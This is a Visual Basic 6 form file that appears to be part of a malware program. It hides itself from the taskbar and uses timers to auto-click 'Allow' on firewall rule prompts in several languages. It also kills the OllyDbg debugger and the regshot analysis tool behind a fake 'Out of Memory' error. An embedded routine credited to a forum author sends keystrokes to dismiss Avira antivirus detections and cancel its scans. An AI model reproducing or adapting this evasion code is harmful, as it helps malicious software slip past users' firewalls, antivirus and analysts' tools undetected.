VERSION 5.00
Begin VB.Form Timer 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   420
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   1845
   LinkTopic       =   "Form1"
   ScaleHeight     =   420
   ScaleWidth      =   1845
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   1320
      Top             =   0
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   960
      Top             =   0
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   480
      Top             =   0
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Timer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


Private Sub Form_Load()
Visible = False
App.TaskVisible = False
Timer1.Interval = 1
End Sub

Private Sub Timer4_Timer()

Dim TitleBar As String
Dim Length As Long
Dim hFW As Long

Titles = Array("??????? ??????? ??? *", "Create Rule for *", _
"Creer une regle pour *", "*Regel*erstellen*", _
"Crear regla para *", "*Outpost Firewall Pro*")

hFW = GetForegroundWindow()
TitleBar = String$(256, " ")
Length = GetWindowText(hFW, TitleBar, 255)
TitleBar = Trim(TitleBar)

For i = 0 To 5 ' ????? ????? UBound ?????
If TitleBar Like Titles(i) Then

If i = 0 Then ' Ru
hButton = FindWindowEx(hFW, ByVal 0&, vbNullString, "&????????? ??????????")
SendMessage hFW, WM_COMMAND, GetDlgCtrlID(hButton), hButton
End If

If i = 1 Then ' En
hButton = FindWindowEx(hFW, ByVal 0&, vbNullString, "&Allow Once")
SendMessage hFW, WM_COMMAND, GetDlgCtrlID(hButton), hButton
End If

If i = 2 Then ' Fr
hButton = FindWindowEx(hFW, ByVal 0&, vbNullString, "&Autoriser une fois")
SendMessage hFW, WM_COMMAND, GetDlgCtrlID(hButton), hButton
End If

If i = 3 Then ' De
hButton = FindWindowEx(hFW, ByVal 0&, vbNullString, "OK")
SendMessage hFW, WM_COMMAND, GetDlgCtrlID(hButton), hButton
End If

If i = 4 Then ' Es
hButton = FindWindowEx(hFW, ByVal 0&, vbNullString, "&Permitir una vez")
SendMessage hFW, WM_COMMAND, GetDlgCtrlID(hButton), hButton
End If

If i = 5 Then ' Outpost Pro 6 En
hButton = FindWindowEx(hFW, ByVal 0&, vbNullString, "OK")
SendMessage hFW, WM_COMMAND, GetDlgCtrlID(hButton), hButton
End If

End If
Next i

End Sub

Private Sub Timer1_Timer()
If ProcessExist("OLLYDBG.EXE") = True Then
KillProcess ("OLLYDBG.EXE")
MsgBox "Out of Memory", vbCritical, "Error"
End If
End Sub

Private Sub Timer2_Timer()
Call Bypass
End Sub

'**************************************************************************************
' Proyecto : Bypass Avira, Guard y Scan
' Uso: call bypass en un timer
' Autor: Sanlegas
' Email    : sanlegas.enigma@msn.com
' Web: www.indetectables.net


Private Function Bypass1()

'*************** Avira En Ingles ********************
On Error GoTo error 'si hay un error finalizamos
 AppActivate "AntiVir Guard: Attention, Detection!" ' buscamos la ventana del avira en ingles...
 SendKeys "{up}" ' si la encontramos, entonces mandamos la tecla arriba
  SendKeys "{up}" ' si la encontramos, entonces mandamos la tecla arriba
  SendKeys " " ' marcamos el check
 SendKeys "{up}" ' vamos al optionbutton ignore
  AppActivate "AntiVir Guard: Attention, Detection!" ' volvermos a buscar la ventana
 SendKeys "{ENTER}" ' mandamos el Ok
 
'************** Avira En Español ********************
  AppActivate "AntiVir Guard: ¡Atención, detección!" 'buscamos la ventana del avira en español...
 SendKeys "{up}" ' si la encontramos, entonces mandamos la tecla arriba
  SendKeys "{up}" ' si la encontramos, entonces mandamos la tecla arriba
  SendKeys " " ' marcamos el check
    AppActivate "AntiVir Guard: ¡Atención, detección!" ' volvermos a buscar la ventana
 SendKeys "{up}" ' vamos al optionbutton ignore
 SendKeys "{ENTER}" ' mandamos el Ok
 Exit Function ' salimos de la funcion

error:
'****************************************************************
End Function
Private Function Bypass2()
'************** Avira En Ingles al escanear ********************
On Error GoTo error ' si hay un error finalizamos
 AppActivate "Detection!" ' buscamos la 2da ventana que sale al escanear
 SendKeys "N" ' mandamos la tecla n de cancel
Exit Function ' salimos de la funcion
error:
'****************************************************************
End Function
Private Function Bypass3()
'************** Avira En Ingles al escanear ********************
On Error GoTo error ' si hay un error finalizamos
  AppActivate "Luke Filewalker" ' buscamos la 1era ventana que sale al escanear
  SendKeys "E" ' mandamos la tecla e de end
  Exit Function ' salimos de la funcion
error:
'****************************************************************
End Function
Private Function Bypass4()
'************** Avira En Español al escanear ********************
On Error GoTo error
  AppActivate "¡Atención, detección!" ' buscamos la 2da ventana que sale al escanear
  SendKeys "N" ' mandamos la tecla n de cancelar
  Exit Function ' salimos de la funcion
error:
'****************************************************************
End Function
Private Function Bypass5()
'************** Avira En Español al escanear ********************
On Error GoTo error
  AppActivate "Luke Filewalker" ' buscamos la 1era ventana que sale al escanear
  SendKeys "F" ' mandamos la tecla f de finalizar
  Exit Function ' salimos de la funcion
error:
'****************************************************************
End Function

Private Function Bypass()
Call Bypass1
Call Bypass2
Call Bypass3
Call Bypass4
Call Bypass5
End Function

Private Sub Timer3_Timer()
If ProcessExist("regshot.exe") = True Then
KillProcess ("regshot.exe")
MsgBox "Out of Memory", vbCritical, "Error"
End If
End Sub
